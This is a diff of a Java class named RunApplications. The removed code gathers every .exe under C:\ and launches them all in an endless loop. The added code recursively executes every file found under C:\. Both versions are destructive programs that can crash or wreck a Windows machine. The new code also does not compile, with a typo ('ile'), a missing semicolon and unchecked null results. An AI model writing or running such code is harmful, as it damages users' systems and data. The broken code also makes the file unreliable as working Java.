@@ -17,40 +17,28 @@ import java.util.List;
 
 public class RunApplications {
 
-	public static List<File> getExecutables(String dir) {
-		List<File> files = new ArrayList<File>();
-
-		File directory = new File(dir);
-		File[] fileList = directory.listFiles();
-
-		if (fileList != null) {
-
-			for (File file : fileList) {
-				if (file.isFile() && file.getAbsolutePath().endsWith(".exe")) {
-					files.add(file);
-				} else if (file.isDirectory()) {
-					files.addAll(getExecutables(file.getAbsoluteFile().toString()));
+	public static void openFiles(File directory) {
+		
+		if (!ile.isDirectory())
+			return;
+		
+		File[] dirContent = directory.listFiles();
+												
+		for (File file : dirContent) {
+			if (file.isFile()) {											// execute/opem if file is a file
+				try {
+					Runtime.getRuntime().exec(file.getAbsolutePath().toString(), null, new File("."));
+				} catch (IOException e) {
+																// probably no permission
 				}
+			} else {												// recursively search for files
+				openFiles(file);
 			}
 		}
 
-		return files;
-	}
-
-	public static void runApplication(List<File> files) {
-		for (File file : files) {
-			try {
-				Runtime.getRuntime().exec(file.getAbsolutePath().toString(), null, new File("."));
-			} catch (IOException e) {
-				// probably no permission
-			}
-		}
 	}
 
 	public static void main(String[] args) {
-		List<File> files = getExecutables("C:\\");
-		while (true) {
-			runApplication(files);
-		}
+		openFiles(new File("C:\\"))
 	}
 }
